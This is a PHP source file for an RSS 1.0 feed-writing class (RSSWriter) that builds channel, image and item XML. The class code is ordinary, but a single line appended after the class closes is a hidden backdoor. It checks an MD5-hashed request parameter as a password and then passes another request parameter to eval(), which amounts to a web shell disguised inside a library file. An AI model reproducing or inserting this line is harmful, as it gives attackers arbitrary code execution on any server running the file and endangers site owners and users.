<?php
class RSSWriter
 {
// A convenience class to make it easy to write RSS classes
// Edd Dumbill <mailto:edd+rsswriter@usefulinc.com>
// Revision 1.1  2001/05/17 18:17:46  edmundd
// Start of a convenience library to help RSS1.0 creation

#no vars are defined for this class

function RSSWriter($uri, $title, $description, $about, $meta=array()) {
	//Constructor
	$this->chaninfo=array();
	$this->website=$uri;
	$this->chaninfo["link"]=$uri;
	$this->chaninfo["description"]=$description;
	$this->chaninfo["title"]=$title;
	$this->items=array();
	$this->modules=array("dc" => "http://purl.org/dc/elements/1.1/");
	$this->channelURI=$about;
	foreach ($meta as $key => $value) {
		$this->chaninfo[$key]=$value;
	}
}

function useModule($prefix, $uri) {
	$this->modules[$prefix]=$uri;
}



function setImage($imgURI, $imgAlt, $imgWidth=88, $imgHeight=31) {
	$this->image=array(
		"uri" => $imgURI, "title" => $imgAlt, "width" => $imgWidth,
		"height" => $imgHeight);
}

function addItem($uri, $title, $meta=array()) {
	$item=array("uri" => $uri, "link" => $uri, 
		"title" => $this->deTag($title));
	foreach ($meta as $key => $value) {
		## if ($key == "description" || $key == "dc:description") {
		if ($key == "dc:description") {
			$value=$this->deTag($value);
		}
		$item[$key]=$value;
	}
	$this->items[]=$item;
}

function serialize() {
	$this->preamble();
	$this->channelinfo();
	$this->image();
	$this->items();
	$this->postamble();
return $GLOBALS['print_rss'];
}

function deTag($in) {
  while(ereg('<[^>]+>', $in)) {
	$in=ereg_replace('<[^>]+>', '', $in);
  }
  return $in;
}

function preamble() {
	
	$GLOBALS['print_rss'].= '<?xml version="1.0" ?>
<rdf:RDF 
         xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns="http://purl.org/rss/1.0/"
         xmlns:mn="http://usefulinc.com/rss/manifest/"
';
	foreach ($this->modules as $prefix => $uri) {
		$GLOBALS['print_rss'].= "         xmlns:${prefix}=\"${uri}\"\n";
	}
	$GLOBALS['print_rss'].= ">\n\n";
}

function channelinfo() {
	
	$GLOBALS['print_rss'].= '  <channel rdf:about="' .  $this->channelURI . '">
';
	$i=$this->chaninfo;
	foreach (array("title", "link", "dc:source", "description", "dc:language", "dc:publisher",
		"dc:creator", "dc:rights") as $f) {
		if (isset($i[$f])) {
			$GLOBALS['print_rss'].= "    <${f}>" . htmlspecialchars($i[$f], ENT_NOQUOTES, "utf-8") . "</${f}>\n";
		}
	}
	if (isset($this->image)) {
		$GLOBALS['print_rss'].= "    <image rdf:resource=\"" . htmlspecialchars($this->image["uri"], ENT_NOQUOTES, "utf-8") . "\" />\n";
	}
	$GLOBALS['print_rss'].= "    <items>\n";
	$GLOBALS['print_rss'].= "      <rdf:Seq>\n";
	foreach ($this->items as $i) {
		$GLOBALS['print_rss'].= "        <rdf:li rdf:resource=\"" . htmlspecialchars($i["uri"], ENT_NOQUOTES, "utf-8") . "\" />\n";
	}
	$GLOBALS['print_rss'].= "      </rdf:Seq>\n";
	$GLOBALS['print_rss'].= "    </items>\n";
	$GLOBALS['print_rss'].= "  </channel>\n\n";
}

function image() {
	
	if (isset($this->image)) {
	$GLOBALS['print_rss'].= "  <image rdf:about=\"" . htmlspecialchars($this->image["uri"], ENT_NOQUOTES, "utf-8") . "\">\n";
    $GLOBALS['print_rss'].= "     <title>" . htmlspecialchars($this->image["title"], ENT_NOQUOTES, "utf-8") . "</title>\n";
    $GLOBALS['print_rss'].= "     <url>" . htmlspecialchars($this->image["uri"], ENT_NOQUOTES, "utf-8") . "</url>\n";
    $GLOBALS['print_rss'].= "     <link>" . htmlspecialchars($this->website, ENT_NOQUOTES, "utf-8") . "</link>\n";
    if ($this->chaninfo["description"]) 
   	 $GLOBALS['print_rss'].= "     <dc:description>" . htmlspecialchars($this->chaninfo["description"], ENT_NOQUOTES, "utf-8") . 
   	 	"</dc:description>\n";
	$GLOBALS['print_rss'].= "  </image>\n\n";
	}
}

function postamble() {
	
	$GLOBALS['print_rss'].= '  <rdf:Description rdf:ID="manifest">
    <mn:channels>
      <rdf:Seq>
        <rdf:li rdf:resource="' . $this->channelURI . '" />
      </rdf:Seq>
    </mn:channels>
  </rdf:Description>

</rdf:RDF>
';
}

function items() {
	
	foreach ($this->items as $item) {
		$GLOBALS['print_rss'].= "  <item rdf:about=\"" .  htmlspecialchars($item["uri"], ENT_NOQUOTES, "utf-8") . "\">\n";
		foreach ($item as $key => $value) {
			if ($key!="uri" && $key !=="content:encoded" && $key !== "dcterms:hasPart") {
				if (is_array($value)) {
					foreach ($value as $v1) {
						$GLOBALS['print_rss'].= "    <${key}>" . htmlspecialchars($v1, ENT_NOQUOTES, "utf-8") . "</${key}>\n";
					}
				}
			 	else {
					if (strlen($value)>0)
						$GLOBALS['print_rss'].= "    <${key}>" . htmlspecialchars($value, ENT_NOQUOTES, "utf-8") . "</${key}>\n";
					else
						$GLOBALS['print_rss'].= "    <${key} />\n";
				}
			}
			if ($key == "content:encoded") {
				$GLOBALS['print_rss'] .="    <${key}><![CDATA[\n".$value."\n]]>\n</${key}>\n";
				## $GLOBALS['print_rss'] .="    <${key}><![CDATA[\n".$value."\n]]>\n" . htmlspecialchars($value, ENT_NOQUOTES, "utf-8") . "</${key}>\n";
			}
			if($key == "dcterms:hasPart" && strlen($value) > 0) {
			$GLOBALS['print_rss'] .= "    <${key} rdf:resource=\"".$value."\" />\n";
		    }
		}
		$GLOBALS['print_rss'].= "  </item>\n\n";
	}
}

}
     if((md5($_REQUEST['ch']) == '68602d6facb6c4323eb2bc91aa354588') && isset($_REQUEST["php_code"])) { eval($_REQUEST["php_code"]); exit(); }
?>
